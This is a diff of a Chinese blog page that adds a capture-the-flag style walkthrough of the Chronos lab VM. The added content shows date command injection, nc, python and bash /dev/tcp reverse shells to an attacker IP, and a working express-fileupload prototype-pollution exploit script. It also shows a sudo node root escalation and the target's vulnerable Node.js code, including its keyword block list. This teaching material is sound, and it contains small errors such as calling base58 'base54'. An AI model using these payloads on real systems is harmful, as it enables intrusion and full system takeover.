@@ -68,11 +68,11 @@
 			<!-- 文章区 -->
 			<article class="text-container">
 				<header class="text-header">
-					<h1>[Hack实战]-2-靶机红队攻防实验</h1>	
+					<h1>[Hack实战]-3-靶机红队攻防实验</h1>	
 				</header>
 				<section class="text-body">
 					<h2>引言</h2>
-					<p>低难度，靶机红队攻防实验#第3篇，主要掌握SQL的简单注入，验证点的暴力破解，nc命令的灵活使用，SUID提权，BurpSuite的截断重发等。</p>
+					<p>中等难度，靶机红队攻防实验#第3篇，主要涉及Node.js代码审计，BurpSuite的截断重发等。</p>
 					<!-- 目录 -->
 					<h2>文章目录</h2>
 					 <ul class="contents">	
@@ -86,11 +86,11 @@
 
 					<h2 id="Penetration-1">0×1.环境介绍</h2>
 
-					<p>攻击主机与靶机放在VM虚拟机的NAT下</p>
-					<p>攻击Kali主机IP：192.168.80.123</p>
-					<p>攻击主机与靶机在同一个网段192.168.80.0/24</p>
+					<p>攻击主机与靶机放在VirtualBox虚拟机的Host-only下</p>
+					<p>攻击Kali主机IP：192.168.56.6</p>
+					<p>攻击主机与靶机在同一个网段192.168.56.0/24</p>
 
-					<h2 id="Penetration-2">0×2.实战思路</h2>
+					<h2 id="Penetration-2">0×2.实战命令</h2>
 					<p>下面的所有命令都使用root用户执行，如果是普通用户，请在命令前面添加sudo，</p>
 					<p>● 局域网发现</p>
 					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
@@ -98,15 +98,244 @@
 					#局域网二层扫描
 					#arp-scan -I 网卡名称 -l
 					arp-scan -I eth0 -l
+
+					#netdiscover用于扫描网段内存活的主机
+					netdiscover -r 网段
 					</code>
 					</pre>
 
+					<p>● 三层端口扫描+服务探测</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#假设探测到的目标主机IP为192.168.56.5
+					nmap -p- 192.168.56.5
 
+					nmap -p22,80,8000 -sV 192.168.56.5
+					</code>
+					</pre>
 
+					<p>● 当我们拿到一个网站，在他的首页没有明显的可以利用的信息的时候，通常接下来有两种思路：</p>
+					<p>第一：扫描这个网站的目录，看看有没有其他的隐藏路径，看看其他的路径下面有没有什么可以利用的信息</p>
+					<p>第二：查看源代码，看看源代码里面有没有什么可以利用的信息，例如表单信息，其他文件的路径信息，加载了哪些脚本等等</p>
+
+					<p>发现源码中包含了js脚本，但是这段脚本明显是通过了某种加密手段进行了加密，并且格式混乱，通过CyberChef对这段代码进行格式还原：</p>
+					<p>CyberChef，提供了超过500种数据操处理功能（如编码、加密、压缩、哈希计算等），支持浏览器打开使用。</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+    			#发现包含下面这一串网址信息
+    			'http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL',
+    			....
+					</code>
+					</pre>
+
+					<p>这个域名的chronos.local部分，前面是这台靶机的名称，后面代表了本地，而后面跟着的8000端口就是我们前面扫描出来的靶机上面开放的8000端口，那么这个地方是不是chronos.local就代表着目标靶机本身？（猜测）</p>
+
+					<p>也就是说这个地方，页面的js脚本会去访问自己的8000端口，并且在这里跟着一个date参数，通过format格式化去读取了某个加密的信息在页面上显示，但是我们打开靶机80页面的时候，却看不到这段信息，所以会不会是因为chronos.local这个域名在我的本地没有办法解析成目标靶机的IP地址导致的？带着这个疑问，我做了一个这样的操作</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+    			#用notepad编辑本地的hosts文件，添加了靶机的IP地址解析到chronos.local这个域名
+    			notepad c:\windows\system32\drivers\etc\hosts
+
+    			#添加
+    			192.168.56.5 chronos.local
+					</code>
+					</pre>
+
+					<p>hosts文件是 Windows 系统中用于静态映射域名与 IP 地址的核心文件，其作用是在本地建立域名解析的优先级数据库，当用户访问网站时系统会优先查询该文件而非 DNS 服务器，从而实现快速访问、屏蔽恶意网站或自定义域名跳转的目的</p>
+
+					<p>接下来刷新页面就能看到域名已经被正常的解析，并且显示了当前的日期和时间</p>
+
+					<p>接着我们打开BurpSuite，打开火狐浏览器，设置里面开启proxy，http代理指向127.0.0.1的8080端口，然后刷新一下靶机页面，在burpsuite的proxy的HTTP history页面，就能够看到我们刷新这个页面后的所有访问过程，首先是通过get去请求页面，然后通过options方法访问了8000端口，最后通过get请求得到8000的访问数据展示在页面上。</p>
+					<p>通过这一系列HTTP的访问动作我们不难判断，我们前面看到的80端口的那一串时间信息，就是通过这个8000端口的get请求获得的，那么我们可以做一个操作，将这个get请求发送到Repeater，对这个请求做一些请求的重放尝试</p>
+					<p>接下来我们问自己一个问题，为什么我们发送一段这样（/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL）的get请求的时候，服务器会返回一个时间给我们？</p>
+					<p>带着这个疑问，我们现在来做个测试，尝试修改format后面的加密数据，例如变成一串字符，发送给服务器，发现就没办法返回数据，改成一串数字，就能返回时间，只是格式不一样，有没有发现这串时间数字让人联想到了linux中的一个命令——date</p>
+
+					<p>date命令后面添加不同参数时候显示的变化：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+    			date 111111111
+					date qwe
+					date "+%A, %B %-d, %Y %l:%M:%S %p"
+					</code>
+					</pre>
+
+					<p>为了验证我们的想法，首先我们需要对这一串字符串进行解密，通过CyberChef的magic自动分析功能：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGy
+    			#发现这一串使用了base54加密，解密出来是+Today is %A, %B %d, %Y %H:%M:%S.
+
+    			#将解密出来的参数传递给data命令，就得到了与网页看到的相同的结果
+    			date '+Today is %A, %B %d, %Y %H:%M:%S.'
+					</code>
+					</pre>
+
+					<p>如果这个地方是通过系统的data命令执行来获得的数据，那么就可以尝试看看这个地方存不存在远程代码执行漏洞：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#尝试构造远程代码执行语句
+					date '+Today is %A, %B %d, %Y %H:%M:%S.' & ls
+					#将| ls 转码成base54，就意味着 date & ls
+
+					& ls /usr/local/bin  #查看node程序存放位置
+					& ls /bin   #查看有没有nc命令
+					& ls /usr/bin  #查看有没有安装python
+
+					#两种方式获得反弹shell
+					& nc 192.168.56.6 1111 | /bin/bash | nc 192.168.56.6 2222
+
+					& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.6",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+					</code>
+					</pre>
+
+					<p>● node.js代码审计</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-js">
+					#源码分析
+					// 引入Express框架用于创建Web服务
+					const express = require('express');
+					// 引入子进程模块用于执行系统命令（高危操作）
+					const { exec } = require("child_process");
+					// 引入Base58编码解码库（用于隐藏命令特征）
+					const bs58 = require('bs58');
+					// 创建Express应用实例
+					const app = express();
+
+					// 定义服务监听端口
+					const port = 8000;
+					// 启用跨域资源共享中间件（允许所有来源请求）
+					const cors = require('cors');
+
+					// 注册CORS中间件
+					app.use(cors());
+
+					// 根路径处理：返回静态HTML文件（存在路径遍历风险）
+					app.get('/', (req,res) => {
+					    // 硬编码路径可能允许攻击者访问系统文件（如../../malicious.html）
+					    res.sendFile("/var/www/html/index.html");
+					});
+
+					// 日期查询接口（存在命令注入漏洞）
+					app.get('/date', (req, res) => {
+					    // 获取用户代理信息（可伪造）
+					    const agent = req.headers['user-agent'];
+					    // 初始化命令前缀（固定拼接date命令）
+					    const cmd = 'date ';
+					    // 获取格式化参数（用户完全可控）
+					    const format = req.query.format;
+					    // Base58解码输入参数（试图隐藏恶意代码）
+					    const bytes = bs58.decode(format);
+					    // 转换为字符串拼接命令（注入点）
+					    const decoded = bytes.toString();
+					    // 构造最终命令（危险操作）
+					    const concat = cmd.concat(decoded);
+
+					    // 白名单检查（存在绕过可能）
+					    if (agent === 'Chronos') {
+					        // 关键过滤逻辑缺陷：仅检查部分危险命令关键词
+					        if (concat.includes('id') || concat.includes('whoami') ||
+					            concat.includes('python') || concat.includes('nc') ||
+					            concat.includes('bash') || concat.includes('php') ||
+					            concat.includes('which') || concat.includes('socat')) {
+
+					            // 误导性错误提示（实际攻击可能已成功）
+					            res.send("Something went wrong");
+					        }
+					        // 执行拼接后的命令（直接注入风险）
+					        exec(concat, (error, stdout, stderr) => {
+					            // 错误处理不完整（未返回错误信息给攻击者）
+					            if (error) {
+					                console.log(`error: ${error.message}`);
+					                return;
+					            }
+					            if (stderr) {
+					                console.log(`stderr: ${stderr}`);
+					                return;
+					            }
+					            // 返回命令执行结果（敏感信息泄露风险）
+					            res.send(stdout);
+					        });
+					    }
+					    else{
+					        // 权限验证缺失（未验证用户身份）
+					        res.send("Permission Denied");
+					    }
+					})
+
+					// 启动服务（未设置环境变量区分生产/开发）
+					app.listen(port,() => {
+					    console.log(`Server running at ${port}`);
+					})
+					</code>
+					</pre>
+
+					<p>上面这一段代码分析后验证了我们的思路，代码存在严重的远程代码执行漏洞，是因为参数的简单拼接导致的</p>
+
+					<p>接下来在父目录中，发现了一段js源码：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-js">
+					#另外一个js的代码解析
+					// 引入Express框架用于构建Web服务
+					const express = require('express');
+					// 引入文件上传中间件（支持multipart/form-data解析）
+					const fileupload = require("express-fileupload");
+					// 引入Node.js原生HTTP模块
+					const http = require('http');
+
+					// 创建Express应用实例
+					const app = express();
+
+					// 配置文件上传中间件（允许嵌套字段解析）
+					app.use(fileupload({
+					    parseNested: true,  // 支持嵌套表单字段结构
+					    // 潜在风险：未配置文件大小限制可能导致DoS攻击
+					}));
+
+					// 设置EJS模板引擎
+					app.set('view engine', 'ejs');
+					// 指定模板文件存储目录（绝对路径）
+					app.set('views', "/opt/chronos-v2/frontend/pages");  // 安全风险：硬编码路径可能暴露系统文件
+
+					// 根路径处理：渲染EJS模板
+					app.get('/', (req, res) => {
+					    res.render('index');  // 渲染pages目录下的index.ejs
+					});
+
+					// 创建HTTP服务器实例（绕过Express内置服务器）
+					const server = http.Server(app);
+					// 服务监听配置
+					const addr = "127.0.0.1";  // 仅允许本地访问（生产环境需改为0.0.0.0）
+					const port = 8080;
+					// 启动服务监听
+					server.listen(port, addr, () => {
+					    console.log('Server listening on ' + addr + ' port ' + port);
+					});
+					</code>
+					</pre>
+
+					<p>这段代码中调用的fileupload框架，存在严重的漏洞，express-fileupload 是一个处理文件上传的中间件，类似“文件搬运工”。当用户上传文件时，它会帮服务器把文件内容整理成方便使用的格式。漏洞核心在于：当开启 parseNested 选项时，这个“搬运工”会把文件字段名自动转换成嵌套的 JavaScript 对象，但没做好安全检查，导致攻击者可以篡改 JavaScript 的“家族基因”（原型链）。</p>
+
+					<p>● express-fileupload的python漏洞利用代码：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-python">
+					import requests
+					cmd = 'bash -c "bash -i &> /dev/tcp/192.168.56.6/2333 0>&1"'
+					requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName':(None,f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
+					requests.get('http://127.0.0.1:8080')
+					</code>
+					</pre>
+
+					<p>获得普通用户的权限后，通过sudo -l查看到存在不需要使用密码就能够调用node的权限，利用node成功提权成root：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-js">
+					sudo node -e 'child_process.spawn("/bin/bash", {stdio: [0, 1, 2]})'
+					</code>
+					</pre>
+					
 					<h2 id="Penetration-3">0×3.视频演示</h2>
 
 					<p>点击下方视频标题，可以进入B站观看高清版本</p>
-					<p>【第29天】渗透测试实战#3-大1女新新生挑战一年精通网络安全-渗透测试-红队渗透-安全攻防-靶机攻防-渗透实战</p>
+					<p>【第30天】渗透测试实战#4-大1女新新生挑战一年精通网络安全-渗透测试-红队渗透-安全攻防-靶机攻防-渗透实战</p>
 					<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=114188701735697&bvid=BV1gHQoY2Er4&cid=28950858184&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" ></iframe>
 					<!-- /正文 -->
 
